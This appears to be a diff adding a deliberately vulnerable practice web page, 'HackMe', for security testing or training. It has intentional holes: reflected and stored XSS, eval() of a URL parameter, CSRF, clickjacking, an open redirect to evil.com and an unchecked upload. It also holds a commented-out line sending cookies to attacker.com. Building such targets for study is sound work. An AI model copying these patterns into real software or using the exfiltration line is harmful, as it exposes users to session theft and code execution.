@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Vulnerable Test Site</title>
+  <style>
+    body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
+    input, button, textarea { background: #000; color: #0f0; border: 1px solid #0f0; margin: 5px; }
+  </style>
+</head>
+<body>
+  <h1>🔥 Welcome to HackMe!</h1>
+
+  <!-- Reflected XSS -->
+  <form action="" method="GET">
+    <label>Search:</label>
+    <input type="text" name="q" />
+    <button type="submit">Submit</button>
+    <p>Results for: <script>document.write(location.search.slice(3))</script></p>
+  </form>
+
+  <!-- Stored XSS -->
+  <form action="store_comment.php" method="POST">
+    <label>Comment:</label><br>
+    <textarea name="comment"></textarea><br>
+    <input type="submit" value="Submit" />
+  </form>
+  <!-- Displaying stored comments -->
+  <div id="comments"></div>
+  <script>
+    fetch("comments.json").then(r => r.json()).then(data => {
+      data.forEach(c => {
+        document.getElementById("comments").innerHTML += `<p>${c}</p>`;
+      });
+    });
+  </script>
+
+  <!-- CSRF -->
+  <form action="change_password.php" method="POST">
+    <input type="hidden" name="password" value="newpassword123" />
+    <button type="submit">Change Password</button>
+  </form>
+
+  <!-- SQL Injection -->
+  <form action="login.php" method="POST">
+    <label>Username:</label><input name="user" />
+    <label>Password:</label><input name="pass" />
+    <input type="submit" />
+  </form>
+
+  <!-- Clickjacking -->
+  <iframe src="https://example.com" style="opacity:0.1; position:absolute; top:0; left:0; width:100%; height:500px;"></iframe>
+
+  <!-- Open Redirect -->
+  <a href="redirect.php?url=https://evil.com">Click here to win a prize!</a>
+
+  <!-- File Upload -->
+  <form action="upload.php" method="POST" enctype="multipart/form-data">
+    <input type="file" name="upload" />
+    <input type="submit" />
+  </form>
+
+  <!-- eval() -->
+  <script>
+    const code = new URLSearchParams(location.search).get("exec");
+    if (code) eval(code);
+  </script>
+
+  <!-- Cookie Theft -->
+  <script>
+    document.cookie = "session=abc123";
+    // Uncomment to simulate exfil
+    // new Image().src = "http://attacker.com?c=" + document.cookie;
+  </script>
+
+</body>
+</html>
